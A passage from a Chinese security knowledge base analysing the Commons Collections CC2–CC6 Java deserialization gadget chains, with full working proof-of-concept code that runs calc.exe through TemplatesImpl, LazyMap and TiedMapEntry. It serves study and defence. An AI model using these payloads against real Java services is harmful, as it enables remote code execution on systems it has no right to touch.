这里对比父类是否是AbstractTranslet,这里就解释了0x2中为什么一定要继承AbstractTranslet![图片.png](https://cdn.nlark.com/yuque/0/2022/png/21929389/1652082143879-39850134-ba3f-452f-8c61-cf922ebad974.png#clientId=u2044ba9c-3055-4&from=paste&height=1040&id=ud6aeed6a&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=226366&status=done&style=none&taskId=uf58db8f4-bd39-4362-a990-c488fc90c71&title=&width=1920)如果_transletIndex没有被赋值（初始值为-1）,那么在下面的if语块中就会抛出异常![图片.png](https://cdn.nlark.com/yuque/0/2022/png/21929389/1652082286939-0a17fea0-b100-49f5-88f9-537705637d53.png#clientId=u2044ba9c-3055-4&from=paste&height=1040&id=u66837fde&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=197424&status=done&style=none&taskId=uf1652a5d-e632-4357-b802-c81ca450865&title=&width=1920)在这里实例化_class[_transletIndex].newInstance()，也就是我们使用Javassit生成的恶意代码（执行Runtime.getRuntime.exec()`） 总结 构造CC2要比CC1更复杂，其中CC2使用TemplatesImpl需要注意 comparator不需要再构造transformerChain，而是需要调用TemplayesImpl的newTransformer方法 恶意类需要继承AbstractTranslet类 对应的参数一定要构造正常 链路为TemplatesImpl.newTransformer -> getTransletInstance() -> defineTransletClasses -> 得到字节数组还原为的Class对象 -> 实例化 最后添加根据ysoserial CC2 的payload，改了一个可用的poc package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.CannotCompileException; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class yso2CC2 { public static void main(String[] args) throws Exception { InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); PriorityQueue queue = new PriorityQueue(2,new TransformingComparator(transformer)); queue.add(1); queue.add(2); setFieldValue(transformer,\"iMethodName\",\"newTransformer\"); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); // cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); Object[] queueArray = (Object[]) getFieldValue(queue, \"queue\"); queueArray[0] = templates; queueArray[1] = 1; try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./ycc2.ser\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./ycc2.ser\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } public static Object getFieldValue(final Object obj, final String fieldName) throws Exception { final Field field = getField(obj.getClass(), fieldName); return field.get(obj); } } 参考链接 https://xz.aliyun.com/t/8164 https://xz.aliyun.com/t/10387 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:01:06 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/02.CC2/CommonsCollection2分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/03.CC3/CommonsCollections3分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/03.CC3/CommonsCollections3分析.html","title":"CommonsCollections3分析","keywords":"","body":" 简介 前置知识 TrAXFilter InstantiateTransformer POC 分析 0x1 0x2 0x3 0x4 调试 参考链接 简介 CC3 相当于CC1，CC2的结合，环境依赖需要commons collections 3.1，jdk1.7，以及javasisst 对应的利用链如下： ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() 前置知识 CC1 lazymap 分析 CC2 TemplatesImpl 分析 在分析CC3之前需要了解一下新出现的两个类 TrAXFilter 在该类的构造方法中，调用了传入参数的newTransformer()方法，看到这个方法有点熟悉了，可以实例化，并且参数可控 CC2中，就是在InvokerTransformer.transform()中通过反射调用TemplatesImpl.newTransformer()方法，而CC3中，就可以直接使用TrAXFilter来调用newTransformer()方法 InstantiateTransformer 在该类中实现了Transformer，Serializable接口 在它的transform方法中，实现了当传入的input为class时，可以直接获取其对应的构造函数直接实例化并返回 POC package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.annotation.Target; import java.lang.reflect.*; import java.util.HashMap; import java.util.Map; public class TestCC3 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); // cc.writeFile(); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap); try{ FileOutputStream fileOutputStream = new FileOutputStream(\"payload3.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(handler); FileInputStream fileInputStream = new FileInputStream(\"payload3.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } 分析 0x1 与CC2 相同，通过javasisst动态创建一个类，这个类里包括static代码，只要实例化这个类就能执行static里的代码，最后将该类转换成字节码存储在byte[][]这个二维数组中，在CC2 中可以知道这个字节码是被用来存储在private byte[][] _bytecodes这个二维数组中被实例化的 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); // cc.writeFile(); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } 0x2 第二步同CC1的LazyMap 利用链，不过这里的Transformer[]中，ConstantTransformer的构造函数传入的TrAXFilter.class，而这个类构造函数接收的_templates参数，也就是我们在第一步中构造的_templates实例，当调用(TransformerImpl) templates.newTransformer();的时候，就会调用我们构造的恶意类的static方法 Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap); 而怎么才能调用(TransformerImpl) templates.newTransformer();呢，这个时候就要用InstantiateTransformer了，InstantiateTransformer，前置知识中提到了该类实现了Transformer，Serializable接口，当传入的input为class时，可以直接获取其对应的构造函数直接实例化并返回 那么当链式调用的时候，传入input是TrAXFilter，在对其进行实例化的时候，我们已经通过InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})构造函数，已经将iParamTypes，iArgs传入，其中iParamTypes = Templates.class, iArgs = javasisst创建的恶意类，在实例化的时候 0x3 LazyMap get()方法调用了transform()方法，factory参数就是传入的transformerChain，达到了代码2的条件 0x4 还是P牛那句话： 如果将AnnotationInvocationHandler对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get。 AnnotationInvocationHandler是调用处理器，outerMap是被代理的对象，只要调用了LazyMap中的任意方法，就会触发AnnotationInvocationHandler中的invoke方法； 而在readObject方法中调用了entrySet()方法，所以触发invoke 这样就基本上达到了执行命令所需要的条件。 调试 this.memberValues参数值为LazyMap，调用了它的entrySet方法，触发到invoke方法； 跟进到ChainedTransformer.transform()，对transformers[]数组进行循环；第一轮循环，iTransformers[0]参数值为ConstantTransformer，进入它的transform方法，返回TrAXFilter类；第二轮循坏，iTransformers[1]参数值为InstantiateTransformer，TrAXFilter作为参数传入transform方法； 在getConstructor(iParamTypes)中，iParamTypes参数为Templates类，获取到构造函数为TrAXFilter，且在实例化的时候，需要传递Templates类型的参数，iargs则是我们构造的对应的Templates类实例（templates），在实例化过程中，再调用TransformerImpl的newTransformer()； 方法； 实例化_class[_transletIndex]，该参数的值就为EvilCat9080096364400() 最后命令执行成功 参考链接 https://xz.aliyun.com/t/10454#toc-1 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:01:55 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/03.CC3/CommonsCollections3分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/04.CC4/CommonsCollections4分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/04.CC4/CommonsCollections4分析.html","title":"CommonsCollections4分析","keywords":"","body":" 简介 前置知识 环境 利用链 POC 分析 0x1 0x2 0x3 0x4 调试 简介 CC4 相当于 CC2 + CC3 的结合，在ysoseria中CC4提及的是，Variation on CommonsCollections2 that uses InstantiateTransformer instead of InvokerTransformer. 也就是说CC4 只需要在CC2的基础上（javassist）将InvokerTransformer修改成InstantiateTransformer,InstantiateTransforme 在CC3中可以知道，实现了Transformer，Serializable接口，在它的transform方法中，实现了当传入的input为class时，可以直接获取其对应的构造函数直接实例化并返回，要达到使用InstantiateTransforme 的transform方法，这时又离不开TrAXFilter的构造函数，在其实例化之后就能调用TransformerImpl的newTransformer方法，最后实现调用恶意代码 前置知识 Commons Collections2 分析 Commons Collections3 分析 环境 jdk1.8 commons collections4利用链 ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() POC ```java package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestCC4 { public static void main(String[] args) throws Exception{ PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] taegetClassBytes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field field = templates.getClass().getDeclaredField(\"_bytecodes\"); field.setAccessible(true); field.set(templates,taegetClassBytes); Field field1 = templates.getClass().getDeclaredField(\"_name\"); field1.setAccessible(true); field1.set(templates,\"123\"); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chain = new ChainedTransformer(transformers); queue.add(1); queue.add(1); TransformingComparator Tcomparator = new TransformingComparator(chain); Field comparator_field = PriorityQueue.class.getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); try{ FileOutputStream fileOutputStrem = new FileOutputStream(\"cc4.ser\"); ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStrem); outputStream.writeObject(queue); FileInputStream fileInputStream = new FileInputStream(\"cc4.ser\"); ObjectInputStream inputStream = new ObjectInputStream(fileInputStream); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } ![image.png](Commons Collections4 分析.assets/2023_05_19_10_37_25_uGqCkxoU.png) ## 分析 ### 0x1 ```java PriorityQueue queue = new PriorityQueue(1); CC2中我们可以知道，为什么明明PriorityQueue的构造函数中可以传入TransformingComparator的实例，但是我们却不使用可以传入TransformingComparator实例的构造方法，因为在传入之后，会直接调用TransformingComparator实例的方法，导致在还没有序列化的时候程序就已经crash了，这一步是实现CC2，CC4的关键 0x2 通过javasisst创建恶意代码，并将恶意代码写入到TemplatesImpl实例化后的_bytecodes,_name参数中，详情看Commons Collections3 分析 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] taegetClassBytes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field field = templates.getClass().getDeclaredField(\"_bytecodes\"); field.setAccessible(true); field.set(templates,taegetClassBytes); Field field1 = templates.getClass().getDeclaredField(\"_name\"); field1.setAccessible(true); field1.set(templates,\"123\"); 0x3 ChainedTransformer类会把我们的Transformer变成一个串，用于执行transform方法链式调用transformers[] 给队列赋值 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chain = new ChainedTransformer(transformers); queue.add(1); queue.add(1); 0x4 当赋值操作完成之后，再对comparator进行赋值操作，这样就能在赋值操作前不直接crash掉，并且在反序列化的时候comparator不为空，又能直接调用transform方法 TransformingComparator Tcomparator = new TransformingComparator(chain); Field comparator_field = PriorityQueue.class.getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); 调试 在调试过程中，前部分同CC2，一直到comparator.compare(),comparator为反射传入的Tcomparator，当调用compare方法时，就会执行this.transformer.transform(obj1),最后就回直接到TraXFilter的构造函数里，执行newTransformer 最后在getTransletInstance函数里，将传入的字节码实例化 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:03:27 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/04.CC4/CommonsCollections4分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/05.CC5/CommonsCollections5分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/05.CC5/CommonsCollections5分析.html","title":"CommonsCollections5分析","keywords":"","body":" 简介 TiedMapEntry BadAttributeValueExpException POC 0x1 0x2 调试 简介 CC5 利用的还是CC1的链路，使用LazyMap，只要调用了LazyMap.get()，就可以触发ChainedTransformer，链式调用，那么在CC5中，在哪儿会调用这个get方法呢？ 在CC1 LazyMap 利用链中，我们知道动态代理对象调用任何一个方法时会调用handler中的invoke方法，然而我们知道sun.reflect.annotation.AnnotationInvocationHandler，会发现实际上这个类就是一个InvocationHandlerAnnotationInvocationHandler类，如果将这个恶意对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中。 在CC5中这里引入了新的两个类，分别是TiedMapEntry，BadAttributeValueExpException TiedMapEntry 可以看到map，和key都是可控的，在调用getValue的时候，就直接调用get方法，实现LazyMap#get() 那么要在哪里调用这个getvalue函数呢，在TiedMapEntry里，我们可以看到该类为其实现了一个toString()方法 那么找到能调用TiedMapEntry#toString()方法就显得至关重要，接下来BadAttributeValueExpException类就会带来一片光明 BadAttributeValueExpException BadAttributeValueExpexception 在readObject的时候，如果能读这个valObj为TiedMapEntry的实例，那么是不是就是一条完美的链路？ 在此处，我们可以看到BadAttributeValueExpexception 的构造函数只有一个值val，但是类型是Object，那么我们可以按如下构造，当其反序列化的时候，调用readObject()函数的时候，反序列化得到的valObj就是对应的TiedMapEntry实例 // 创建一个实例 BadAttributeValueExpException val = new BadAttributeValueExpException(null); // 反射赋值 Field valfield = val.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(val,\"TiedMapEntry实例对象\"); POC package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; /* @params Test Env jdk8u181 Commons Collection3.1 */ public class TestCC5 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"1\"); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field valfield = val.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(val,entry); try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cc5.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(val); FileInputStream fileInputStream = new FileInputStream(\"cc5.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } } 0x1 第一部分为CC1 LazyMap 利用链前部分，也可以参考CC1 分析，这里只要调用了LazyMap#get，就会触发ChainedTransformer.transform(),进而对transformers链式调用 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,transformerChain); 0x2 在简介中可以看到，TiedMapEntry实例化的entry需要赋值给BadAttributeValueExpException@val,当反序列化的时候，取到对象，则会调用TiedMapEntry#toString方法，进而调用TiedMapEntry#get方法，其中Map可控，就是反序列化得来的恶意的TiedMapEntry实例lazymap TiedMapEntry entry = new TiedMapEntry(lazyMap, \"1\"); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field valfield = val.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(val,entry); 对应的调用链为 Gadget chain: ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 调试 调试过程和LazyMap是一样的，我们在LazyMap#get处factory.transform(key)处打下断点来分析 可以看到利用链路为BadAttributeValueExpException.readObject()-> TiedMapEntry.toString()-> LazyMap.get()->ChainedTransformer.transform() 这里就是常规链式调用了 注：在调试过程中，如果在LazyMap#get前的堆栈打上断点，就无法进入LazyMap.get()的if语句 在调试过程中，如果在LazyMap.get()之前的堆栈中打下断点，比如BadAttributeValueExpException.readObject()、TiedMapEntry.toString()、TiedMapEntry.getValue()处打上断点，是无法进入 LazyMap.get()if 判断语句 在这里可以看到，我圈起来的部分，这里的意思就是已经执行了，因为发生调用了，只不过debug无法进入 到这里我们直接看LazyMap.get()方法，这里断点一定要打在if处，不然是不能进入断点 可以看到，在if处，得到了map参数已经不是空，而是在序列化的时候已经赋的初值。 可以通过比较没有在LazyMap.get()前的堆栈下断点的区别 图1 LazyMap.get()堆栈前下断点 图2 LazyMap.get()堆栈前无断点 这就是为什么我在调试部分我没有在其他函数处打断点，而是直接在LazyMap#get()处打断点。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:04:18 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/05.CC5/CommonsCollections5分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/06.CC6/CommonsCollections6分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/06.CC6/CommonsCollections6分析.html","title":"CommonsCollections6分析","keywords":"","body":" 简介 分析链路 环境 ysoserial分析 POC ysoserial（反序列化的HashSet） 更改poc(反序列化HashMap) 更改POC_1(反序列化HashSet 1次反射) 简介 CC6 也是利用的是CC1 LazyMap#get, 触发ChainedTransformer链式调用，当然和CC5一样，得去寻找对应在哪儿会调用LazyMap#get,这里还是使用TiedMapEntry类，因为该类的构造函数map值可控，可以构造为lazymap，在Commons Collections 5 分析中，可以知道只要调用TiedMapEntry#getvalue 就能执行TiedMapEntry#get 在TiedMapEntry#get方法中，map值即为可控的lazymap 目前在jdk1.7，jdk8u81测试是没有问题 分析链路 /* Gadget chain: java.io.ObjectInputStream.readObject() java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() by @matthias_kaiser */ 环境 jdk1.7 Commons Collection 3.1 看一下TiedMapEntry.java 源码，在hashCode() 方法中调用了getValue()函数，也就是需要找到TiedMapEntry的实例来调用这个hashCode()函数 /** * Constructs a new entry with the given Map and key. * * @param map the map * @param key the key */ public TiedMapEntry(Map map, Object key) { super(); this.map = map; this.key = key; } /** * Gets the value of this entry direct from the map. * * @return the value */ public Object getValue() { return map.get(key); } /** * Gets a hashCode compatible with the equals method. * * Implemented per API documentation of {@link java.util.Map.Entry#hashCode()} * * @return a suitable hash code */ public int hashCode() { Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } 那么去看看ysoserial里提供的CC6链路（这里截取一部分），从readObject()之后，主要需要看HashMap#put-> HashMap#hash是如何调用到TiedMapEntry#hashcode，这时就需要关注HashMap类 java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() 我们从后往前分析先看HashMap#hash 这里传递的参数k是一个Obejct，只要k对象不是String类型，那么就会执行hashCode()方法，那么这里就需要想办法让指定参数k为TiedMapEntry的实例 // HashMap.java final int hash(Object k) { int h = hashSeed; if (0 != h && k instanceof String) { return sun.misc.Hashing.stringHash32((String) k); } h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h >>> 20) ^ (h >>> 12); return h ^ (h >>> 7) ^ (h >>> 4); } 继续看HashMap#put, 在下面代码块的20行调用了hash()，此处put(K key, V value)接收的参数key要传入key保证为TiedMapEntry的实例，且table不能为EMPTY_TABLE // HashMap.java /** * Associates the specified value with the specified key in this map. * If the map previously contained a mapping for the key, the old * value is replaced. * * @param key key with which the specified value is to be associated * @param value value to be associated with the specified key * @return the previous value associated with key, or * null if there was no mapping for key. * (A null return can also indicate that the map * previously associated null with key.) */ public V put(K key, V value) { if (table == EMPTY_TABLE) { inflateTable(threshold); } if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); for (Entry e = table[i]; e != null; e = e.next) { Object k; if (e.hash == hash && ((k = e.key) == key || key.equals(k))) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(hash, key, value, i); return null; } 再往上回溯，可以看到在HashSet#readObject，在下面的代码块中，第24行，map.put(e,PRESENT)在put过程中，map为HashMap，e为对应的TiedMapEntry的实例，就能保证整个链路完整执行 // HashSet.java /** * Reconstitute the HashSet instance from a stream (that is, * deserialize it). */ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in any hidden serialization magic s.defaultReadObject(); // Read in HashMap capacity and load factor and create backing HashMap int capacity = s.readInt(); float loadFactor = s.readFloat(); map = (((HashSet)this) instanceof LinkedHashSet ? new LinkedHashMap(capacity, loadFactor) : new HashMap(capacity, loadFactor)); // Read in size int size = s.readInt(); // Read in all elements in the proper order. for (int i=0; i ysoserial分析 // jdk1.7 && Commons Collections 